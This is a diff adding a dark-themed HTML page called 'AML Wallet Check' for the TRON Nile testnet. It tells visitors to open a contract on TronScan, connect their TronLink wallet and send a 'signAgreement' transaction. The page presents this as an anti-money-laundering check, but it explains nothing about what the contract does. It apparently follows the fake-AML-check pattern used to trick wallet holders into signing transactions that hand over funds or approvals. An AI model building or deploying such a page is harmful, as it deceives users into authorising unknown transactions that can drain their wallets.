@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AML Check</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #0B0E11;
+            color: #fff;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .container {
+            max-width: 400px;
+            text-align: center;
+        }
+        
+        h1 {
+            font-size: 1.5rem;
+            margin-bottom: 10px;
+            color: #00D4AA;
+        }
+        
+        .subtitle {
+            color: #8B949E;
+            margin-bottom: 30px;
+        }
+        
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 20px;
+            background: #3375BB;
+            color: white;
+            text-decoration: none;
+            border-radius: 12px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+        
+        .manual {
+            background: #151A21;
+            border: 1px solid #2D333B;
+            border-radius: 12px;
+            padding: 20px;
+            text-align: left;
+            margin-top: 20px;
+        }
+        
+        .manual-title {
+            color: #3375BB;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+        
+        .step {
+            color: #8B949E;
+            margin: 10px 0;
+            font-size: 0.9rem;
+        }
+        
+        .address {
+            font-family: monospace;
+            font-size: 0.75rem;
+            background: #0B0E11;
+            padding: 12px;
+            border-radius: 8px;
+            word-break: break-all;
+            margin-top: 10px;
+            border: 1px solid #2D333B;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>AML Wallet Check</h1>
+        <p class="subtitle">Nile Testnet Verification</p>
+        
+        <a href="https://nile.tronscan.org/#/contract/THx3C9sYx3pNguHftcu8TRiSNSY5vp2bjN" class="btn" target="_blank">
+            Open Contract on TronScan
+        </a>
+        
+        <div class="manual">
+            <div class="manual-title">How to verify:</div>
+            <div class="step">1. Tap button above (opens TronScan)</div>
+            <div class="step">2. Tap "Connect Wallet" on TronScan</div>
+            <div class="step">3. Select TronLink</div>
+            <div class="step">4. Find "Write Contract" section</div>
+            <div class="step">5. Click "signAgreement" and send</div>
+            
+            <div class="address">
+                Contract: THx3C9sYx3pNguHftcu8TRiSNSY5vp2bjN
+            </div>
+        </div>
+    </div>
+</body>
+</html>
